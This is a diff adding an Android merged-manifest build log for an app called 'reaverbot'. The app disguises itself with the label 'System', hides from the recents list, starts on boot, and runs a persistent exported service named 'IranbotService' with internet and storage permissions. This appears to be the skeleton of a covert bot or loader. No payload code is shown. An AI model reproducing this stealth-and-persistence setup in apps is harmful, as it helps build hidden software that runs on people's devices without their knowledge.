@@ -1,0 +1,117 @@
+1<?xml version="1.0" encoding="utf-8"?>
+2<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+3    package="com.reaverbot.load"
+4    android:versionCode="1"
+5    android:versionName="1.0" >
+6
+7    <uses-sdk
+8        android:minSdkVersion="14"
+8-->/Users/mac/Desktop/b/adb-priv/reaverbotApp/app/src/main/AndroidManifest.xml
+9        android:targetSdkVersion="29" />
+9-->/Users/mac/Desktop/b/adb-priv/reaverbotApp/app/src/main/AndroidManifest.xml
+10
+11    <uses-permission android:name="android.permission.INTERNET" />
+11-->/Users/mac/Desktop/b/adb-priv/reaverbotApp/app/src/main/AndroidManifest.xml:5:5-67
+11-->/Users/mac/Desktop/b/adb-priv/reaverbotApp/app/src/main/AndroidManifest.xml:5:22-64
+12    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+12-->/Users/mac/Desktop/b/adb-priv/reaverbotApp/app/src/main/AndroidManifest.xml:6:5-81
+12-->/Users/mac/Desktop/b/adb-priv/reaverbotApp/app/src/main/AndroidManifest.xml:6:22-78
+13    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+13-->/Users/mac/Desktop/b/adb-priv/reaverbotApp/app/src/main/AndroidManifest.xml:7:5-80
+13-->/Users/mac/Desktop/b/adb-priv/reaverbotApp/app/src/main/AndroidManifest.xml:7:22-77
+14    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+14-->/Users/mac/Desktop/b/adb-priv/reaverbotApp/app/src/main/AndroidManifest.xml:8:5-81
+14-->/Users/mac/Desktop/b/adb-priv/reaverbotApp/app/src/main/AndroidManifest.xml:8:22-78
+15    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+15-->/Users/mac/Desktop/b/adb-priv/reaverbotApp/app/src/main/AndroidManifest.xml:9:5-77
+15-->/Users/mac/Desktop/b/adb-priv/reaverbotApp/app/src/main/AndroidManifest.xml:9:22-74
+16    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
+16-->/Users/mac/Desktop/b/adb-priv/reaverbotApp/app/src/main/AndroidManifest.xml:10:5-87
+16-->/Users/mac/Desktop/b/adb-priv/reaverbotApp/app/src/main/AndroidManifest.xml:10:22-84
+17    <uses-permission android:name="android.permission.WAKE_LOCK" />
+17-->/Users/mac/Desktop/b/adb-priv/reaverbotApp/app/src/main/AndroidManifest.xml:11:5-68
+17-->/Users/mac/Desktop/b/adb-priv/reaverbotApp/app/src/main/AndroidManifest.xml:11:22-65
+18    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
+18-->/Users/mac/Desktop/b/adb-priv/reaverbotApp/app/src/main/AndroidManifest.xml:12:5-95
+18-->/Users/mac/Desktop/b/adb-priv/reaverbotApp/app/src/main/AndroidManifest.xml:12:22-92
+19
+20    <application
+20-->/Users/mac/Desktop/b/adb-priv/reaverbotApp/app/src/main/AndroidManifest.xml:14:5-55:19
+21        android:allowBackup="true"
+21-->/Users/mac/Desktop/b/adb-priv/reaverbotApp/app/src/main/AndroidManifest.xml:15:9-35
+22        android:debuggable="true"
+23        android:label="System"
+23-->/Users/mac/Desktop/b/adb-priv/reaverbotApp/app/src/main/AndroidManifest.xml:16:9-31
+24        android:networkSecurityConfig="@xml/network_security_config"
+24-->/Users/mac/Desktop/b/adb-priv/reaverbotApp/app/src/main/AndroidManifest.xml:19:9-69
+25        android:requestLegacyExternalStorage="true"
+25-->/Users/mac/Desktop/b/adb-priv/reaverbotApp/app/src/main/AndroidManifest.xml:20:9-52
+26        android:theme="@android:style/Theme.Holo.Light"
+26-->/Users/mac/Desktop/b/adb-priv/reaverbotApp/app/src/main/AndroidManifest.xml:17:9-56
+27        android:usesCleartextTraffic="true" >
+27-->/Users/mac/Desktop/b/adb-priv/reaverbotApp/app/src/main/AndroidManifest.xml:18:9-44
+28        <activity
+28-->/Users/mac/Desktop/b/adb-priv/reaverbotApp/app/src/main/AndroidManifest.xml:22:9-30:20
+29            android:name="com.reaverbot.load.MainActivity"
+29-->/Users/mac/Desktop/b/adb-priv/reaverbotApp/app/src/main/AndroidManifest.xml:23:13-41
+30            android:excludeFromRecents="true"
+30-->/Users/mac/Desktop/b/adb-priv/reaverbotApp/app/src/main/AndroidManifest.xml:25:13-46
+31            android:exported="true" >
+31-->/Users/mac/Desktop/b/adb-priv/reaverbotApp/app/src/main/AndroidManifest.xml:24:13-36
+32            <intent-filter>
+32-->/Users/mac/Desktop/b/adb-priv/reaverbotApp/app/src/main/AndroidManifest.xml:26:13-29:29
+33                <action android:name="android.intent.action.MAIN" />
+33-->/Users/mac/Desktop/b/adb-priv/reaverbotApp/app/src/main/AndroidManifest.xml:27:17-69
+33-->/Users/mac/Desktop/b/adb-priv/reaverbotApp/app/src/main/AndroidManifest.xml:27:25-66
+34
+35                <category android:name="android.intent.category.LAUNCHER" />
+35-->/Users/mac/Desktop/b/adb-priv/reaverbotApp/app/src/main/AndroidManifest.xml:28:17-77
+35-->/Users/mac/Desktop/b/adb-priv/reaverbotApp/app/src/main/AndroidManifest.xml:28:27-74
+36            </intent-filter>
+37        </activity>
+38
+39        <service
+39-->/Users/mac/Desktop/b/adb-priv/reaverbotApp/app/src/main/AndroidManifest.xml:32:9-37:46
+40            android:name="com.reaverbot.load.IranbotService"
+40-->/Users/mac/Desktop/b/adb-priv/reaverbotApp/app/src/main/AndroidManifest.xml:33:13-43
+41            android:directBootAware="true"
+41-->/Users/mac/Desktop/b/adb-priv/reaverbotApp/app/src/main/AndroidManifest.xml:37:13-43
+42            android:exported="true"
+42-->/Users/mac/Desktop/b/adb-priv/reaverbotApp/app/src/main/AndroidManifest.xml:34:13-36
+43            android:foregroundServiceType="dataSync"
+43-->/Users/mac/Desktop/b/adb-priv/reaverbotApp/app/src/main/AndroidManifest.xml:35:13-53
+44            android:stopWithTask="false" />
+44-->/Users/mac/Desktop/b/adb-priv/reaverbotApp/app/src/main/AndroidManifest.xml:36:13-41
+45
+46        <receiver
+46-->/Users/mac/Desktop/b/adb-priv/reaverbotApp/app/src/main/AndroidManifest.xml:39:9-49:20
+47            android:name="com.reaverbot.load.BootReceiver"
+47-->/Users/mac/Desktop/b/adb-priv/reaverbotApp/app/src/main/AndroidManifest.xml:40:13-41
+48            android:directBootAware="true"
+48-->/Users/mac/Desktop/b/adb-priv/reaverbotApp/app/src/main/AndroidManifest.xml:43:13-43
+49            android:enabled="true"
+49-->/Users/mac/Desktop/b/adb-priv/reaverbotApp/app/src/main/AndroidManifest.xml:42:13-35
+50            android:exported="true" >
+50-->/Users/mac/Desktop/b/adb-priv/reaverbotApp/app/src/main/AndroidManifest.xml:41:13-36
+51            <intent-filter>
+51-->/Users/mac/Desktop/b/adb-priv/reaverbotApp/app/src/main/AndroidManifest.xml:44:13-48:29
+52                <action android:name="android.intent.action.BOOT_COMPLETED" />
+52-->/Users/mac/Desktop/b/adb-priv/reaverbotApp/app/src/main/AndroidManifest.xml:45:17-79
+52-->/Users/mac/Desktop/b/adb-priv/reaverbotApp/app/src/main/AndroidManifest.xml:45:25-76
+53                <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED" />
+53-->/Users/mac/Desktop/b/adb-priv/reaverbotApp/app/src/main/AndroidManifest.xml:46:17-86
+53-->/Users/mac/Desktop/b/adb-priv/reaverbotApp/app/src/main/AndroidManifest.xml:46:25-83
+54                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
+54-->/Users/mac/Desktop/b/adb-priv/reaverbotApp/app/src/main/AndroidManifest.xml:47:17-82
+54-->/Users/mac/Desktop/b/adb-priv/reaverbotApp/app/src/main/AndroidManifest.xml:47:25-79
+55            </intent-filter>
+56        </receiver>
+57        <receiver
+57-->/Users/mac/Desktop/b/adb-priv/reaverbotApp/app/src/main/AndroidManifest.xml:51:9-53:40
+58            android:name="com.reaverbot.load.RestartReceiver"
+58-->/Users/mac/Desktop/b/adb-priv/reaverbotApp/app/src/main/AndroidManifest.xml:52:13-44
+59            android:exported="false" />
+59-->/Users/mac/Desktop/b/adb-priv/reaverbotApp/app/src/main/AndroidManifest.xml:53:13-37
+60    </application>
+61
+62</manifest>
